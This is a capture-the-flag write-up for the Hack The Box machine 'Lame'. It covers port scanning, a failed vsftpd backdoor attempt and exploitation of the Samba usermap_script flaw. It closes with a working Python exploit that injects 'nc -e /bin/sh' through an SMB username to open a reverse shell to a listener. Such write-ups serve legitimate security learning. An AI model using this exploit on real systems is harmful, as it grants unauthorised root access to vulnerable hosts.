---
layout: default
title: Lame
permalink: /htb/lame
---

# Lame

> **Name:** Lame
>
> **Creator:** [ch4p](https://www.hackthebox.eu/home/users/profile/1)
>
> **Difficulty:** Easy


## Intro

[Lame](https://www.hackthebox.eu/home/machines/profile/1) was released on 14 Mar 2017 and among the first boxes released on the platform. It is one of the easier linux boxes available, which makes it a good place to start for beginners. I originally completed this when it had already retired and I was making my way through some of the older boxes to help further my understanding. As it was so simple I never made notes so I've had to fully go back and re-do the box to make this write-up, whilst doing this I discovered there was more and one way to do it!


## Getting Started

As is always the case we start off with performing a full port scan against the box to  get an idea of what services are available. My preferred command is shown below:

``` nmap -p- 10.10.10.3 -sC -sV -oA full-scan ```

This command runs a SYN, or half-open scan against all ports. With the additional flags running default scripts, version detection and creating an output file in various formats. 

The scan gives the following results:

![Scan Results]({{site.url}}/assets/lame/scan-results.png)


## Basic Vulnerability Check

From here it is best to go through each service in turn, and check for any known vulnerabilities for the versions in use and for any interesting results from the nmap scripts that were run. Checking the service version in Searchsploit is a good way to quickly identify some vulnerabilities, but this is not always exhaustive and it is worth performing some searches on various sites to get more information. Straight away searchsploit delivers the goods with the first check against ftp.

![Searchsploit Results]({{site.url}}/assets/lame/vsftpd-searchsploit.png)

Nothing was found for ssh, but the Samba service also had an entry within searchsploit that looks promising. 

![Searchsploit Results]({{site.url}}/assets/lame/samba-searchsploit.png)

A final check for the distcc service also reveals another potential attack vector. I think this service may be a bit slow to start upon spawning the box as my initial nmap scan didn't identify the port as being open. Yet when I ran another later on it was there. 

![Searchsplot Results]({{site.url}}/assets/lame/distcc-searchsploit.png)

So from the an initial check of all the available services there are publcily available exploits for 3 of them! This is incredibly unusual for hackthebox. 


## Exploitation

With so many potential ways forward it is best to prioritise which one to start with. But since I've seen the vsftpd exploit previously it seems a good place to start, followed by Samba, and then finally distcc. Purely because distcc is something I am unfamiliar with. 

### FTP

The nmap scripts seen in the earlier results also show that anonymous access is enabled, so a quick connect and check for any files is performed.

![Anonymous FTP]({{site.url}}/assets/lame/ftp-anonymous.png)

No luck this time! It is all empty. So, onto the exploit. The Rapid7 page for this [exploit](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor) gives the following the description:

>This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.

Having a look at the ruby script is useful for figuring out how the exploit works. 

![VSFTPD Exploit]({{site.url}}/assets/lame/vsftpd-exploit.png)

The small excerpt from the msf module shows that a username ending in ```:)``` and password of random characters is sent and a service becomes available on port 6200. It isn't necessary to use the metasploit module to exploit this, you could login with a username ending in ```:)``` and a random password. Then use netcat to connect to the bindshell on port 6200. However, for an unknown reason the backdoor is not accessible in this instance. Best guess is that there are some firewall rules on the box that prevent 6200 from becoming externally available. 

This is the reason why it is important to have a quick check of all services first before diving in. As we already know that we have other potential avenues. 

### Samba

Checking the Rapid7 site for this [exploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script) gives the following description:

> This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!

Checking the ruby script shows that it is as easy as sending a crafted username with a payload after it. 

![Samba Exploit]({{site.url}}/assets/lame/msf-script.png)

First of all there needs to be a share we can connect to, so smbclient is used to get a list of available shares. 

![Shares]({{site.url}}/assets/lame/smb-shares.png)

You may have noticed an additional option in that command. On newer versions of SMBClient it is configured to prevent connection to older versions of SMB, so this setting just needs to be set so we can connect properly. Otherwise the connection will be terminated.

It is possible to null authenticate to the /tmp share and use the logon command to submit the crafted username to get a shell

![Exploit]({{site.url}}/assets/lame/smb-exploit.png)

Yay! Straight to root. Lets grab that flag. 

As a fun exercise I decided to make an autopwn exploit for this box. The basic part of running the exploit was straight forward, especially if you had a listener setup seperately. The trickier part was getting the listener running, explot to run and the listener to accept the incoming connection. There are probably more refined ways to do this - but it works.

```import argparse
from smb.SMBConnection import SMBConnection
from smb import smb_structs
import socket
import multiprocessing
import time

# Create a mini help file to show which flags are required
parser = argparse.ArgumentParser(description='Lame Exploit')
parser.add_argument('-l', required=True, type=str, help='Listener IP')
parser.add_argument('-p', required=True, type=int, help='Listener Port')
args = parser.parse_args()

# Set user args to variables for use later
host = args.l
port = args.p

# Create malicious username
username = '/=`nohup nc -e /bin/sh ' + host + ' ' + str(port) + '`'
password = 'hunter2'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Set up a listener
def listener():
    s.bind((host, port))
    s.listen(5)
    print('Listening on port: ' + str(port))

# Catch that shell
def cmd():
    client_socket, client_addr = s.accept()
    print(f'{client_addr[0]}:{client_addr[1]} Connected!')
    print('Whoop! Shell Time!\n')
    while True:
        command = input("")
        if command.lower() == 'exit':
            break
        command = command.encode()
        client_socket.send(command + b'\n')
        response = client_socket.recv(2048).decode()
        print(response)
    client_socket.close()
    print('Exiting')
    s.close()

# Create SMB Connection
def exploit():
    smb_structs.SUPPORT_SMB2 = False
    conn = SMBConnection(username, password, 'doesnotmatter', 'lame', use_ntlm_v2 = True)
    print('Launching exploit')
    conn.connect('10.10.10.3', 445)
    time.sleep(1)
    close()

# Launch this thing in multiprocessing
if __name__ == '__main__':
    p = multiprocessing.Process(name='p', target=listener)
    p1 = multiprocessing.Process(name='p1', target=exploit)
    p.start()
    time.sleep(1)
    p1.start()
    cmd()

```
